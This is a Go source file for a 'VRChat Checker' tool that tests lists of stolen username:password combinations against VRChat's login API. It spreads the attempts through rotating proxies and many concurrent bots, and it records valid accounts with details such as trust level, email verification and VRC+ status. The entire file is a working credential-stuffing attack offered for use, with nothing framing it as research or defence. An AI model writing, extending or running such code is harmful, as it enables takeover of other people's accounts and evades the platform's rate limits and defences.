//go:generate goversioninfo

package main

import (
	"VRChat_Checker/Shared"
	"bufio"
	"encoding/base64"
	"fmt"
	"github.com/buger/jsonparser"
	"github.com/gookit/color"
	"github.com/gosuri/uilive"
	"github.com/paulbellamy/ratecounter"
	"io/ioutil"
	"log"
	"net/http"
	"net/http/cookiejar"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	hits        = 0
	fails       = 0
	retries     = 0
	globalindex = 0
	AccCh       chan string
	RC          *ratecounter.RateCounter
)

func main() {

	_, _ = SetConsoleTitle("VRChat Checker GO by top#2222")
	RC = ratecounter.NewRateCounter(1 * time.Second)
	reader := bufio.NewReader(os.Stdin)
	cCount, err := Shared.CManager.LoadFromFile("combos.txt")
	if err != nil {
		color.Red.Println("Please ensure proxies.txt & combos.txt exist!")
		_, _ = fmt.Scanln()
		select {}
		return
	}
	color.Success.Println("Loaded", cCount, "combos")

	x := 1
	Blue := color.FgLightBlue.Render
	color.HiBlue.Println("\n  _____ _                  _ _         \n | ____| |_ ___ _ __ _ __ (_) |_ _   _ \n |  _| | __/ _ \\ '__| '_ \\| | __| | | |\n | |___| ||  __/ |  | | | | | |_| |_| |\n |_____|\\__\\___|_|  |_| |_|_|\\__|\\__, |\n                                 |___/ \n")
	fmt.Println("Proxy Type: \n",
		" 1.", Blue("Http \n"),
		" 2.", Blue("Socks4 \n"),
		" 3.", Blue("Socks4a \n"),
		" 4.", Blue("Socks5 \n"),
		" 5.", Blue("Proxyless (Don't use unless testing)"))
	pType, err := reader.ReadString('\n')
	Clr()
	pType = strings.ReplaceAll(strings.ReplaceAll(pType, "\n", ""), "\r", "")
	if len(pType) > 0 {
		x, err = strconv.Atoi(pType)
		if err != nil {
			log.Fatal(err.Error())
			return
		}
		if x == 0 {
			x = 1
		}
	}
	pCount := 0
	if x != 5 {
		pCount, err = Shared.PManager.LoadFromFile("proxies.txt", x-1)
		if err != nil {
			log.Fatal(err.Error())
		}
		color.Success.Println("Loaded", pCount, "proxies")
	}

	color.FgLightCyan.Print(fmt.Sprintf("Number of Bots [Default: %d]: ", Shared.BotCount))
	e, err := reader.ReadString('\n')
	Clr()
	e = strings.ReplaceAll(strings.ReplaceAll(e, "\n", ""), "\r", "")
	if len(e) > 0 {
		Shared.BotCount, err = strconv.Atoi(e)
		if err != nil {
			log.Fatal(err.Error())
			return
		}
		if Shared.BotCount <= 0 {
			Shared.BotCount = 1
		}
	}
	t := time.Now()
	if stat, err := os.Stat("./Hits"); err == nil && stat.IsDir() {
		color.Success.Println("Hits directory loaded.")
	} else {
		color.Red.Println("Hits directory not found, creating it.")
		err := os.Mkdir("Hits", 0755)
		if err != nil {
			return
		}
	}
	Shared.OutFile, err = os.Create("Hits\\" + t.Format("2006-01-02_15-04-05"+".txt"))
	defer func(OutFile *os.File) {
		_ = OutFile.Close()
	}(Shared.OutFile)

	Shared.HitChan = make(chan Shared.Account, Shared.BotCount)
	Shared.Semaphore = make(chan int, Shared.BotCount)
	Shared.WaitGroup = sync.WaitGroup{}
	AccCh = make(chan string)

	Shared.WaitGroup.Add(Shared.BotCount)
	for i := 0; i < Shared.BotCount; i++ {
		Shared.Semaphore <- 0
		go WorkerFunc()
	}

	go func() {
		for c := range Shared.HitChan {
			if _, err := Shared.OutFile.WriteString(c.ToString() + "\r\n"); err != nil {
				panic(err)
			}
		}
	}()
	go func() {
		var writer *uilive.Writer
		if runtime.GOOS != "windows" {
			writer = uilive.New()
			writer.Start()
			defer writer.Stop()
		}
		for len(Shared.Semaphore) > 0 {
			if runtime.GOOS == "windows" {
				_, _ = SetConsoleTitle(fmt.Sprintf("VRChat Checker GO | %d/%d | Proxies %d | Hits %d | Fails %d | Retries %d | Bots %d | CPM %d", globalindex, cCount, pCount, hits, fails, retries, len(Shared.Semaphore), RC.Rate()*60))
			} else {
				_, _ = fmt.Fprintf(writer, "\t[%d/%d] Hits %d | fails %d | Retries %d | Bots %d | CPM %d\r\n", globalindex, cCount, hits, fails, retries, len(Shared.Semaphore), RC.Rate()*60)
			}
			time.Sleep(250 * time.Millisecond)
		}
	}()

	for _, combo := range Shared.CManager.ComboList {
		AccCh <- combo
	}
	close(AccCh)
	time.Sleep(500 * time.Millisecond)
	Shared.WaitGroup.Wait()
	fmt.Println("Done checking!")
	select {}
}

func WorkerFunc() {
	defer func() {
		Shared.WaitGroup.Done()
		<-Shared.Semaphore
	}()
	for account := range AccCh {
		if len(account) == 0 {
			break
		}
		acc := Shared.Account{Combo: account}

	A:
		transport, proxy, err := Shared.PManager.GetRandomProxyTransport()
		if err != nil {
			if proxy != nil {
				proxy.InUse = false
			}
			goto A
		}

		cookieJar, _ := cookiejar.New(nil)
		b64 := base64.StdEncoding.EncodeToString([]byte(account))
		client := &http.Client{Timeout: 10 * time.Second, Transport: transport, Jar: cookieJar}
		req, err := http.NewRequest("GET", "https://api.vrchat.cloud/api/1/auth/user", nil)
		if err != nil {
			if proxy != nil {
				proxy.InUse = false
			}
			goto A
		}

		req.Header.Add("Authorization", "Basic "+b64)
		req.Header.Add("User-Agent", "VRC.Core.BestHTTP")
		resp, err := client.Do(req)
		if err != nil {
			retries++
			if proxy != nil {
				proxy.InUse = false
			}
			goto A
		}

		cookieJar.SetCookies(req.URL, resp.Cookies())

		raw, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			if proxy != nil {
				proxy.InUse = false
			}
			goto A
		}

		if strings.Contains(string(raw), "currentAvatar") {
			displayName, _, _, err := jsonparser.Get(raw, "displayName")
			if err != nil {
				return
			}
			tags, _, _, err := jsonparser.Get(raw, "tags")

			trust := "visitor"
			VRCPlus := "False"
			if strings.Contains(string(tags), "system_supporter") {
				VRCPlus = "True"
			}
			if strings.Contains(string(tags), "system_trust_basic") {
				trust = "New User"
			}
			if strings.Contains(string(tags), "system_trust_known") {
				trust = "User"
			}
			if strings.Contains(string(tags), "system_trust_trusted") {
				trust = "Known User"
			}
			if strings.Contains(string(tags), "system_trust_veteran") {
				trust = "Trusted User"
			}
			if strings.Contains(string(tags), "system_trust_legend") {
				trust = "Veteran User"
			}
			if strings.Contains(string(tags), "system_legend") {
				trust = "Legendary User"
			}
			if err != nil {
				return
			}
			emailVerified, _, _, err := jsonparser.Get(raw, "emailVerified")
			if err != nil {
				return
			}
			uid, _, _, err := jsonparser.Get(raw, "id")
			if err != nil {
				return
			}
			acc.AddCaptureStr("Username", string(displayName))
			acc.AddCaptureStr("Trust", trust)
			acc.AddCaptureStr("EV", string(emailVerified))
			acc.AddCaptureStr("VRCPlus", VRCPlus)
			acc.AddCaptureStr("User ID", string(uid))
			consolelog := "[+] " + account + " | " + "Username = " + string(displayName) + " | " + "Trust = " + trust + " | " + "Email Verified = " + string(emailVerified) + " | " + "VRC+ = " + VRCPlus + "\n"
			color.Success.Println(consolelog)
			Shared.HitChan <- acc
			hits++
		} else {
			color.Red.Println("[-] " + account)
			fails++
		}
		globalindex++
		RC.Incr(1)
	}
}
